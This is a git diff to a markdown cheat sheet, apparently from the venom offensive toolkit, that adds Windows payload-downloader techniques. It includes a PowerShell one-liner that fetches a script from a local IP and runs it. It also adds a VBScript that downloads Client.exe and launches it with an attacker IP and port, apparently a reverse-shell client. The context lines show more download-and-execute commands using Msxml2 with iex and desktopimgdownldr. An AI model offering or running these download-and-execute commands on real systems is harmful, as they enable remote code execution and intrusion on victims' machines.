@@ -2142,6 +2142,10 @@ Here we can view the all process of encoding/decoding in powershell console
 
 <br />
 
+Powershell Downloaders<br />
+
+      Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" -PassThru;Start-Sleep 1;powershell -File $env:tmp\hello.ps1
+
 COM Donwloaders<br />
 
       $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
@@ -2172,6 +2176,39 @@ Curl Downloaders<br />
 desktopimgdownldr Downloaders<br />
 
       set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
+
+VbScript Downloaders (VBS)<br />
+
+
+```
+' Set your url settings and the saving options
+strFileURL = "https://github.com/r00t-3xp10it/venom/blob/master/bin/Client.exe"
+strHDLocation = "C:\Users\pedro\Desktop\Client.exe"
+
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+objXMLHTTP.open "GET", strFileURL, false
+objXMLHTTP.send()
+
+If objXMLHTTP.Status = 200 Then
+Set objADOStream = CreateObject("ADODB.Stream")
+objADOStream.Open
+objADOStream.Type = 1 'adTypeBinary
+
+objADOStream.Write objXMLHTTP.ResponseBody
+objADOStream.Position = 0    'Set the stream position to the start
+
+Set objFSO = Createobject("Scripting.FileSystemObject")
+if objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
+Set objFSO = Nothing
+
+objADOStream.SaveToFile strHDLocation
+objADOStream.Close
+Set objADOStream = Nothing
+End if
+
+Set objXMLHTTP = Nothing
+CreateObject("WScript.Shell").Exec "Client.exe ip=192.168.1.73 port=666"
+```
 
 ---
 
